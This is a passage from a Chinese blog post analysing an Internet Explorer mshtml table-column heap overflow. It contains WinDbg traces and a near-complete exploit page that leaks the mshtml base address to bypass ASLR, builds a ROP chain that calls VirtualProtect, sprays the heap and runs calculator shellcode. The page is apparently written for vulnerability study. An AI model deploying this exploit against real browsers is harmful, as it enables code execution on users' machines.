class=\"line\">eax=0000029a ebx=006736f0 ecx=00000002 edx=00682128 esi=006f1848 edi=006764f0</span><br><span class=\"line\">eip=6b81f31f esp=024ebdf0 ebp=024ebe94 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x3ac:</span><br><span class=\"line\">6b81f31f 3de8030000      cmp     eax,3E8h</span><br></pre></td></tr></table></figure>\n<p>eax为0x29a，即666.</p>\n<p>接下来和前面一样是写入样式信息的过程，不过这次是对<strong>只能容纳6个样式信息的堆空间写入了666个样式信息</strong>，从而引发了堆溢出错误。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd ebp+0x10</span><br><span class=\"line\">024ebea4  0000029a</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-exp\"><a href=\"#4-exp\" class=\"headerlink\" title=\"4. exp\"></a>4. exp</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"evil\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">style</span>=<span class=\"string\">\"table-layout:fixed\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">col</span> <span class=\"attr\">id</span>=<span class=\"string\">\"132\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"41\"</span> <span class=\"attr\">span</span>=<span class=\"string\">\"9\"</span>&gt;</span>&amp;nbsp;<span class=\"tag\">&lt;/<span class=\"name\">col</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">'javascript'</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//将字符串转换为整数</span></span><br><span class=\"line\"><span class=\"undefined\">function strtoint(str) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    return str.charCodeAt(1)*0x10000 + str.charCodeAt(0);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//初始化布局的字符串变量</span></span><br><span class=\"line\"><span class=\"undefined\">var free = \"EEEE\";</span></span><br><span class=\"line\"><span class=\"xml\">while ( free.length <span class=\"tag\">&lt; <span class=\"attr\">500</span> ) <span class=\"attr\">free</span> += <span class=\"string\">free;</span></span></span></span><br><span class=\"line\"><span class=\"undefined\">var string1 = \"AAAA\";</span></span><br><span class=\"line\"><span class=\"xml\">while ( string1.length <span class=\"tag\">&lt; <span class=\"attr\">500</span> ) <span class=\"attr\">string1</span> += <span class=\"string\">string1;</span></span></span></span><br><span class=\"line\"><span class=\"undefined\">var string2 = \"BBBB\";</span></span><br><span class=\"line\"><span class=\"xml\">while ( string2.length <span class=\"tag\">&lt; <span class=\"attr\">500</span> ) <span class=\"attr\">string2</span> += <span class=\"string\">string2;</span></span></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">var fr = new Array();</span></span><br><span class=\"line\"><span class=\"undefined\">var al = new Array();</span></span><br><span class=\"line\"><span class=\"undefined\">var bl = new Array();</span></span><br><span class=\"line\"><span class=\"undefined\">var div_container = document.getElementById(\"evil\");</span></span><br><span class=\"line\"><span class=\"undefined\">div_container.style.cssText = \"display:none\";</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//接着按字符串E、字符串A、字符串B、CButtonLayout对象进行堆空间布局</span></span><br><span class=\"line\"><span class=\"xml\">for (var i=0; i <span class=\"tag\">&lt; <span class=\"attr\">500</span>; <span class=\"attr\">i</span>+=<span class=\"string\">2)</span> &#123;</span></span></span><br><span class=\"line\"><span class=\"undefined\">    fr[i] = free.substring(0, (0x100-6)/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    al[i] = string1.substring(0, (0x100-6)/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    bl[i] = string2.substring(0, (0x100-6)/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    var obj = document.createElement(\"button\");</span></span><br><span class=\"line\"><span class=\"undefined\">    div_container.appendChild(obj);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//释放布局后字符串E对应的堆空间</span></span><br><span class=\"line\"><span class=\"xml\">for (var i=200; i<span class=\"tag\">&lt;<span class=\"name\">500;</span> <span class=\"attr\">i</span>+=<span class=\"string\">2</span> ) &#123;</span></span></span><br><span class=\"line\"><span class=\"undefined\">    fr[i] = null;</span></span><br><span class=\"line\"><span class=\"undefined\">    CollectGarbage();</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//进行ROP链中Gadget地址和参数的布局，并与填充数据以及shellcode拼接完成堆喷数据的初始化</span></span><br><span class=\"line\"><span class=\"undefined\">//最后执行堆喷将这些数据布局到内存中</span></span><br><span class=\"line\"><span class=\"undefined\">function heapspray(cbuttonlayout) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    CollectGarbage();</span></span><br><span class=\"line\"><span class=\"undefined\">    //处理各个Gadget的地址信息</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop = cbuttonlayout + 4161; // RET</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop = rop.toString(16);</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop1 = rop.substring(4,8);</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop2 = rop.substring(0,4); // &#125; RET</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //......省略，可参见https://www.exploit-db.com/exploits/24017/</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    var rop = cbuttonlayout + 408958; // PUSH ESP</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop = rop.toString(16);</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop23 = rop.substring(4,8);</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop24 = rop.substring(0,4); // &#125; RET</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    var shellcode = unescape(\"%u4141%u4141%u4242%u4242%u4343%u4343\"); // PADDING</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u4141%u4141%u4242%u4242%u4343%u4343\"); // PADDING</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u4141%u4141\"); // PADDING</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //ROP链中的Gadget地址和参数布局，以实现栈转移和DEP绕过</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop1+\"%u\"+rop2); // RETN</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop3+\"%u\"+rop4); // POP EBP # RETN</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop5+\"%u\"+rop6); // XCHG EAX,ESP # RETN</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop3+\"%u\"+rop4); // POP EBP</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop3+\"%u\"+rop4); // POP EBP</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop7+\"%u\"+rop8); // POP EBP</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u1024%u0000\"); // Size 0x00001024</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop9+\"%u\"+rop10); // POP EDX</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u0040%u0000\"); // 0x00000040</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop11+\"%u\"+rop12); // POP ECX</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+writable1+\"%u\"+writable2); // Writable Location</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop13+\"%u\"+rop14); // POP EDI</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop1+\"%u\"+rop2); // RET</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop15+\"%u\"+rop16); // POP ESI</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+jmpeax1+\"%u\"+jmpeax2); // JMP EAX</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop17+\"%u\"+rop18); // POP EAX</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+vp1+\"%u\"+vp2); // VirtualProtect()</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop19+\"%u\"+rop20); // MOV EAX,DWORD PTR DS:[EAX]</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop21+\"%u\"+rop22); // PUSHAD</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop23+\"%u\"+rop24); // PUSH ESP</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u9090%u9090\"); // NOPs</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u9090%u9090\"); // NOPs</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u9090%u9090\"); // NOPs</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //弹出计算器的shellcode</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u6c61%u2e63%u7865%u0065\");</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //初始化堆喷数据</span></span><br><span class=\"line\"><span class=\"undefined\">    var padding = unescape(\"%u9090\");</span></span><br><span class=\"line\"><span class=\"undefined\">    while (padding.length &lt; 1000)</span></span><br><span class=\"line\"><span class=\"undefined\">        padding = padding + padding;</span></span><br><span class=\"line\"><span class=\"undefined\">    var padding = padding.substr(0, 1000 - shellcode.length);</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= padding;</span></span><br><span class=\"line\"><span class=\"undefined\">    while (shellcode.length &lt; 100000)</span></span><br><span class=\"line\"><span class=\"undefined\">        shellcode = shellcode + shellcode;</span></span><br><span class=\"line\"><span class=\"undefined\">    var onemeg = shellcode.substr(0, 64*1024/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    for (i=0; i&lt;14; i++) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        onemeg += shellcode.substr(0, 64*1024/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    onemeg += shellcode.substr(0, (64*1024/2)-(38/2));</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //通过堆喷布局rop和shellcode</span></span><br><span class=\"line\"><span class=\"undefined\">    var spray = new Array();</span></span><br><span class=\"line\"><span class=\"undefined\">    for (i=0; i&lt;100; i++) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        spray[i] = onemeg.substr(0, onemeg.length);</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//触发第一次堆溢出用以获取泄露的mshtml模块基址</span></span><br><span class=\"line\"><span class=\"undefined\">function leak() &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    var leak_col = document.getElementById(\"132\");</span></span><br><span class=\"line\"><span class=\"undefined\">    leak_col.width = \"41\";</span></span><br><span class=\"line\"><span class=\"undefined\">    leak_col.span = \"19\";</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//计算mshtml模块基址，并通过堆喷进行rop和shellcode布局</span></span><br><span class=\"line\"><span class=\"undefined\">function get_leak() &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    var str_addr = strtoint(bl[498].substring((0x100-6)/2+11,(0x100-6)/2+13));</span></span><br><span class=\"line\"><span class=\"undefined\">    str_addr = str_addr - 1410704;</span></span><br><span class=\"line\"><span class=\"undefined\">    setTimeout(function()&#123;heapspray(str_addr)&#125;, 50);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//触发第二次堆溢出用以覆盖虚表指针，使程序转到rop处执行</span></span><br><span class=\"line\"><span class=\"undefined\">function trigger_overflow() &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    var evil_col = document.getElementById(\"132\");</span></span><br><span class=\"line\"><span class=\"undefined\">    evil_col.width = \"1278888\";</span></span><br><span class=\"line\"><span class=\"undefined\">    evil_col.span = \"29\";</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">setTimeout(function()&#123;leak()&#125;, 400);</span></span><br><span class=\"line\"><span class=\"undefined\">setTimeout(function()&#123;get_leak()&#125;, 450);</span></span><br><span class=\"line\"><span class=\"undefined\">setTimeout(function()&#123;trigger_overflow()&#125;, 1000);</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"5-利用详解\"><a href=\"#5-利用详解\" class=\"headerlink\" title=\"5. 利用详解\"></a>5. 利用详解</h3><h4 id=\"绕过ASLR\"><a href=\"#绕过ASLR\" class=\"headerlink\" title=\"绕过ASLR\"></a>绕过ASLR</h4><p>读取<strong>mshtml!CButtonLayout对象的vftable值</strong>可以计算出mshtml.dll模块的基地址，因为该值位于此模块中的固定偏移处，所以可被利用以绕过ASLR，计算出mshtml模块的加载基址（类似Glibc中的main arean的地址）。</p>\n<p>最开始需要对堆空间进行布局，关键代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//初始化布局的字符串变量</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> free = <span class=\"string\">\"EEEE\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( free.length &lt; <span class=\"number\">500</span> ) free += free;</span><br><span class=\"line\"><span class=\"keyword\">var</span> string1 = <span class=\"string\">\"AAAA\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( string1.length &lt; <span class=\"number\">500</span> ) string1 += string1;</span><br><span class=\"line\"><span class=\"keyword\">var</span> string2 = <span class=\"string\">\"BBBB\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( string2.length &lt; <span class=\"number\">500</span> ) string2 += string2;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> fr = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"><span class=\"keyword\">var</span> al = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"><span class=\"keyword\">var</span> bl = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"><span class=\"keyword\">var</span> div_container = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"evil\"</span>);</span><br><span class=\"line\">div_container.style.cssText = <span class=\"string\">\"display:none\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//接着按字符串E、字符串A、字符串B、CButtonLayout对象进行堆空间布局</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>; i &lt; <span class=\"number\">500</span>; i+=<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    fr[i] = free.substring(<span class=\"number\">0</span>, (<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>);</span><br><span class=\"line\">    al[i] = string1.substring(<span class=\"number\">0</span>, (<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>);</span><br><span class=\"line\">    bl[i] = string2.substring(<span class=\"number\">0</span>, (<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> obj = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"button\"</span>);</span><br><span class=\"line\">    div_container.appendChild(obj);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//释放布局后字符串E对应的堆空间</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">200</span>; i&lt;<span class=\"number\">500</span>; i+=<span class=\"number\">2</span> ) &#123;</span><br><span class=\"line\">    fr[i] = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    CollectGarbage();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述代码中的字符串将会分配到堆空间中，并且被转换为BSTR对象（COM）：此对象包含头部和尾部，字符以UNICODE存储，头部4个字节表示字符串长度，尾部2个字节表示结束。比如执行一次下述代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">al[i] = string1.substring(<span class=\"number\">0</span>, (<span class=\"number\">0x100</span> - <span class=\"number\">6</span>)/<span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n<p>与其对应的内存结构就应该如下</p>\n<p><img src=\"https://images.seebug.org/content/images/2017/01/3-1.png-w331s\" alt=\"img\"></p>\n<p>一块占用0x100的内存空间</p>\n<p>代码在布局时会连续填充字符串，由堆空间管理的性质可知分配的这些堆空间最终会紧挨在一起，因此内存中的分布会如上图那样彼此间相邻。同时，这里还利用了堆空间管理中的另一性质（和Glibc的bin机制相似），即当某块堆空间被释放后如果接下来又有新的申请堆空间操作且此释放掉的空间大小合适，那么会将释放掉的该堆空间重新分配给此时的申请操作。我们注意如下代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">style</span>=<span class=\"string\">\"table-layout:fixed\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">col</span> <span class=\"attr\">id</span>=<span class=\"string\">\"132\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"41\"</span> <span class=\"attr\">span</span>=<span class=\"string\">\"9\"</span>&gt;</span>&amp;nbsp;<span class=\"tag\">&lt;/<span class=\"name\">col</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>就这一块来说，程序将为其分配0x1c*9=0xfc字节大小的堆空间，而在布局时释放掉的那些堆空间大小为0x100字节，所以最后释放掉的那块堆空间将会重新分配来保存column的样式信息。最终内存中的分布会是如下这个样子：</p>\n<p><img src=\"https://images.seebug.org/content/images/2017/01/4-1.png-w331s\" alt=\"img\"></p>\n<p>为了计算mshtml.dll模块的基址，我们需要获取黄色区域标识的vftable数值，这里利用了堆溢出，同样，也是通过js代码动态更新span属性值的方式，修改BSTR对象的的size字段，从而可以按索引越界读取到vftable的值。</p>\n<p>对这一块堆布局的代码调试如下：</p>\n<p>在mshtml!_CTableCol::GetAAspan下断点，追踪esi指针即可定位到堆空间：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; bp mshtml!CTableCol::GetAAspan</span><br><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 2 hit</span><br><span class=\"line\">eax=004a8e80 ebx=004dee40 ecx=00000032 